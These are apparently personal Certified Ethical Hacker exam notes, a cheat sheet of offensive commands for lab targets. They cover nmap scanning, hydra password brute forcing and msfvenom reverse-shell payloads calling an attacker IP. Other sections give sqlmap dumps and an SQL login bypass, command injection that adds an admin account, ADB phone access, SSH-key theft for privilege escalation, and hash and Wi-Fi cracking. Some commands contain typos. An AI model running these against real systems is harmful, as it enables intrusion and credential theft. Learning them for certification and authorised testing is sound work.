# CEH MASTER NOTES  <summary> </summary>

**ALWAYS DO SUDO SU**

## 1. SCANNING
### NETWORKS
**Own IP**
ip a | ifconfig

**Scanning network Live Host (ping sweep)**  
nmap -sP <host>/CIDR

**Scanning Live Host without port scan in same subnet (ARP Scan)** 
nmap -PR -sn <host>/CIDR

**Scripts + Version running on taget machine**
nmap -sC -sV <host>/CIDR

**OS of the target machine**
nmap -O <host>

**All open ports of the target**      
nmap -p- <host>/CIDR

**Specific port scan of the target**   
nmap -p (port number) <host>/CIDR

**Aggressive scan**                            
nmap -A <host>/CIDR

**Scanning using NSE scripts** 
nmap --scripts (script name) -p (port number) <host>/CIDR |  https://nmap.org/book/man-nse.html
nmap --script smb-os-discovery.nse <host> (Displays OS, Computer-Name, Domain, WorkGroup and Ports.)

**Scripts + Version + Ports + OS Scan (overall)**
nmap -sC -sV -p- -A -v -T4 <host>/CIDR

**Host discovery**    
netdiscover -i eth0 | netdiscover -r <host>/CIDR
	
### WEB & SERVICES

## 2. SERVICE ENUMERATION

### FTP PORT 21
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp

**Brute force FTP**                         
hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt <host> ftp 
hydra -l administrator -P /usr/share/wordlist/passwords.txt <host> ftp 
ncrack -U usernames.txt -P passwords.txt ftp://<host>
ncrack -U usernames.txt -P passwords.txt <host>:21 -v 
medusa -h <host> -U usernames.txt -P passwords.txt -M ftp 
msf> auxiliary(scanner/ftp/ftp_login)>
set RHOSTS <target IP>
set user_file /path/usernames.txt
set pass_file /path/passwords.txt

**Download file from FTP after login** 
ls then get secret.txt

### SSH PORT 22
https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/

**Brute force username** 
hydra -l root -P passwords.txt [-t 32] <host> ssh
msf> use scanner/ssh/ssh_enumusers |

**Private key brute force**    
msf> use scanner/ssh/ssh_identify_pubkeys |

### TELNET PORT 23
https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet | https://www.hackingarticles.in/penetration-testing-telnet-port-23/ | https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#telnet

**Enumerate Telnet** 
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <host>
**Brute force Telnet credentials** 
hydra -l root -P passwords.txt [-t 32] <host> telnet 

### SMTP PORT 25
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

**Initiate a TCP connection to port 25**
telnet <host>

**Finding MX servers of an organisation**    
dig +short mx google.com

**Enumeration**  
nmap -p25 --script smtp-commands <host>
nmap -p25 --script smtp-open-relay <host> -v

### DNS PORT 53
https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns

**Enumarate DNS**  
dnsrecon -w -d <host> |  dnsrecon -d <host> -z

**Brute forcing**  
nmap --script dns-brute <host>

### NetBIOS PORT 137/138/139   
https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios

**Enumerate NetBIOS** 
nmap -sV -v <host> | sudo nmap -sU --script nbstat.nse -p137 <host> | enum4linux -u martin -p apple -n <host> (all info) | enum4linux -u martin -p apple -P <host> (policy info)

**Enumerate NetBIOS from cmd**   
nbtstat -a <host> (-c list contents of Netbios name cache)

**Enumerate Domain Users**	
net use (Displays connection status, Shared folder/drive and Network Information) | net user | net user /domain | net user [username] | net user [username] /domain

### SNMP PORT 161
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp

**Enumarate SNMP**     
nmap -sU <host> | nmap -sU -p 161 --script=snmp-interfaces <host>

**Identify the processes running on the target machine**
snmp-check <host> (it will show user accounts, processes etc)
Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> snmp
nmap -sU -p 161 --script=snmp-processes <host>

**List valid comunity strings of the server** 
msfconsole
search snmp
use auxiliary/scanner/snmp/snmp_login
show options
set RHOST <host>
exploit

### SMB PORT 445
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

**Enumarate Network File Shares**      
Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> smb
nmap --script smb-enum-shares.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host>
smbclient -L \\<host>

**Logged in Users details**    
nmap --script smb-enum-users.nse -p445 IP
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>

**Workgroups**    
nmap --script smb-enum-users.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>

**Secutiry level information** 
nmap -sC -sV -A -T4 -p 445 <host>

**Domains & Services**  
nmap --script smb-enum-services.nse -p445 <host>
nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 <host> |

**Brute force SMB**     
hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt (optional -vV) <host> smb
nmap --script smb-brute -p 445 <host> |

**Connect to SMB** 
smbclient //<host>/<share_name) -W <domain_name> -U <Username%password> |

**Mount SMB share to kali**
sudo mount -t cifs //<host>/<share_name> /<local path> -o username=<username>,password=<password>
nmap -p 445 --script-enum-users --script-args smbusername=adminitrator, smbpassword=smbserver_771 <host> |

### RDP PORT 3389
https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp

**Use metasploit to confirm the services running is RDP**
msfconsole -q
search rdp
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOST <host>
set RPORT 3333 (if there is no port 3389 on the target)
exploit

**Use hydra to brute force the login credentials**  
hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://<host> -s 3389

**Use RDP tools to connect to machine**     
xfreerdp /u:<username> /p:<password> /v:<host>:3389

### HTTP/HTTPS PORT 80/443/8080/8081

### Port Login

**FTP Login** 			| ftp <host>
**SSH Logi**n			| ssh username@<host>
**TELNET Login**		| telnet <host>

## 3. System Hacking

**To create a Payload**
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 

**To take a reverse TCP connection from windows**
msfdb init && msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST= attacker-IP  
set LPORT= attacker-Port 
run

## 4. SNIFFING

### Filtering packets 
**Password Sniffing using Wireshark**
In pcap file apply filter: http.request.method==POST or http.request.method==get(you will get all the post or get request) 
Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" 
from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.

**To the Find DOS & DDOS**
go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
Statistics > Conversations > IPv4 > Packets
To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0

### Follow up Streams
select_packet > follow > TCP Stream

| Finding Files | 3 |
| Finding Comments | 4 |
| Search Strings | 5 |

## 5. Steganography

**SNOW** - for hiding and extracting hidden data from a text file
**Openstego** - for hiding and extracting hidden data from an image file
**CovertTCP** - for hiding data in TCP/IP packet headers

### SNOW

run cmd from SNOW folder
SNOW.EXE -C -m “<hidden text>” -p “<password>” <txt file> <output txt file>
-C - compile
-m - text we want to hide
-p - password
Extracting data:
SNOW.EXE -C -p <password> <provided txt file>

### Openstego
2 options to Hide or Extract data

**Hide Data**
Click Hide Data
Select a file
Select a cover file
Give a output file name
Click on Hide Data button

**Extract Data**
Click on Extract Data
Select the image
Select the output file
Click on Extract Data

### CovertTCP
Covert TCP help us to hide the data that is being sent over the network by manipulating the TCP/IP header.
We send the data in the left out spaces present in the header 1 Byte at a time.

cc -o covert_tcp covert_tcp.c (On both client and server)

**Sender Machine**
./covert_tcp -source <ip address of sender> -dest <ip address of receiver> -source_port <origin port number> -dest <reciever port number> -file <file name> 

**Receiver Machine**
./covert_tcp -source <ip address of sender> -source_port <sender destination port number> -server -file <file name>

## 6. Cryptography
**Hash Identifier**
https://www.onlinehashcrack.com/hash-identification.php

**Hash Crack**
https://crackstation.net/
https://hashes.com/en/decrypt/hash

Img hidden - Openstego
.hex - Cryptool
Whitespace - SNOW
MD5 - Hashcalc & MD5 Calculator
Encoded - BCTexteditor
Volume & mount - Veracrypt

### Hashmyfiles
for calculating and comparing hashes of files

Drag and drop files to check if they are tampered

### Cryptool 
for encryption/decription of the hex data - by manipulating the key length

### BcTextEncoder 
for encoding and decoding text in a file (.hex)

### CryptoForge 
for encrypting/decrypting the files

When installed you will get the option when right clicking on a file to encrypt/decrypt

### VeraCrypt 
for hiding and encrypting the disk partiotions

### hashcat

Hashcat -a 3 -m 900 hash.txt /rockyou.txt
-a attack mode
-m hashtype
900 md4
1000 NTLM
1800 SHA512CRYPT
110 SHA1 with SALT HASH
0  MD5
100 SHA1
1400 SHA256
3200 BCRYPT
160 HMAC-SHA1

### John

**First analyze hash type**
john hashfile.hash

**Then crack hash**
john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`

**Show the cracked password**
john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash

### hydra

**FTP**: 
hydra -l user -P passlist.txt ftp://<host>
hydra -L userlist.txt -P passlist.txt ftp://<host>
    
**SSH**: 
hydra -l <username> -P <full path to pass> <host> -t 4 ssh

Post Web Form: 
hydra -l <username> -P <wordlist> <host> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://<host>`
- `hydra -l root -P passwords.txt [-t 32] <host> ftp
- `hydra -L usernames.txt -P pass.txt <host> mysql
- `hydra -l USERNAME -P /path/to/passwords.txt -f <host> pop3 -V`
- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<host>`
- `hydra -P common-snmp-community-strings.txt target.com snmp
- `hydra -l Administrator -P words.txt <host> smb t 1
- `hydra -l root -P passwords.txt <host> ssh

### wpscan

Wordpress site only Users Enumeration
wpscan --url http://example.com/ceh --enumerate u

Direct crack if we have user/password detail
wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt

## 7. Hacking WebServers & WebApps

### Nslookup
**To verify Website's Ip**
Nslookup wwww.example.com

### File Upload Vulnerability
**To create a PHP Payload**
Copy the PHP code and create a .php
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw

**To create a Reverse_tcp Connection**
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run

**To find the secret file**
  type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
  
### SQL Injection
Login bypass with [' or 1=1 --]

**OWASP ZAP**
Open the ZAP 
Add the webiste name to Autoscan
Click on the Alert tab to know about Vulnerabilities

**DSSS**
Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)

As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.

python3 dsss.py -u "url" --cookie="cookie"

### sqlmap
Open the vulnerable website 
Copy the cookie from the inspect element
Open the terminal to use sqlmap 

**List databases, add cookie values**
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
OR
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  

**List Tables, add databse name**
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  

**List Columns of that table**
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns

**Dump all values of the table**
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump

**MySQL**
mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
show databases;
use qdpm;
show tables'
select * from users;
show dtabases;
use staff;
show tables;
select * from login;
select * from user;

When you have username and Password for the database.
  
## 8. Hacking Android

### ADB
**To Install ADB**
apt-get update
sudo apt-get install adb -y
adb devices -l

**Connection Establish Steps**
adb connect x.x.x.x:5555
adb devices -l
adb shell  

**To navigate**
pwd
ls
cd Download
ls
cd sdcard

**Download a File from Android using ADB tool**
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop

### PhoeSploit
**To install Phonesploit**
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama

**To run Phonesploit**
python3 phonesploit.py

Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
Type 4, to Access Shell on phone
Download File using PhoneSploit
9. Pull Folders from Phone to PC
Enter the Full Path of file to Download
sdcard/Download/secret.txt


Hacking Web Servers
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

Hacking Web Application
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.

hydra -l user -P passlist.txt ftp://10.10.10.10

Wireshark
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also
Find FQDN
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)

## 9. Cracking Wi-Fi networks
**Cracking Wifi Password**
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

Android
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)



SQLMap - for finding SQL Injection Vulnerabilities
Wpscan - scanning and finding issues in wordpress websites
ADB - for connecting Android devices to PC and binary analysis
Burpsuite - for analysing and manipulating the traffic

## 10. Privilege Escalation Basics
ssh <user_name>@<IP> -p <port>

to check privileges
sudo -l

if there is a user with no pass:
sudo -u <user> /bib/bash
cd \
cd /root
cd .ssh
cat id_rsa
copy the key

nano id_rsa
paste the key
ctrlS ctrlX
chmod 600 id_rsa

ssh root@<IP> -p <port> -i id_rsa
*******************************
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub | ssh USER@HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

ssh <user_name>@<IP> -p <port> -i id_rsa
*******************************
- 1st_file we have permission
- 2nd file we do not have permission

stat -c “%a %A %U %G %F” <file>

strings <file>
if the second file is there:
rm <2nd_file>
cp /bin/bash <2nd_file>
/<1sr_file>
*******************************
cd /var/www/html
grep -nr “db_user”
cat <link>

su or sudo su if we find the pass
*******************************
LinEnum

copy url
git clone <url>
cd LinEnum

LinPEAS
copy latest version
wget <paste>
chmod +x linpeas.sh

./LinEnum.sh
./linepeas.sh


## 11. Malware Threats (RAT)
5 RAT tools

njRAT | MoSucker | ProRat | Theef | HTTP RAT
